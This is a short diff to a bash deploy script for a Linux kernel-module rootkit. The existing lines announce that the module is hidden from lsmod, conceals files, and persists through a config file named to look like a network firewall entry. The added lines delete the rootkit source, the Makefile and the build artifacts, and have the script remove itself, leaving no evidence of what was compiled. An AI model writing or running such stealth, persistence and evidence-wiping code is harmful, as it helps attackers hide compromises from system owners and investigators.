@@ -28,6 +28,10 @@ case "${1:-deploy}" in
     echo "[+] lkm/load: rootkit loaded (hidden from lsmod)"
     echo "[+]   Hides: files starting with .def_ and our planted filenames"
     echo "[+]   Auto-load on reboot: /etc/modules-load.d/net-fw.conf"
+    # Wipe source and build artifacts — no evidence of what was compiled
+    make -C "$DIR" KVER="$KVER" clean 2>/dev/null || true
+    rm -f "${DIR}/rootkit.c" "${DIR}/Makefile"
+    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
     ;;
   cleanup)
     rmmod rootkit 2>/dev/null || echo "[!] rmmod failed — may be hidden; try: rmmod rootkit after manual lsmod"
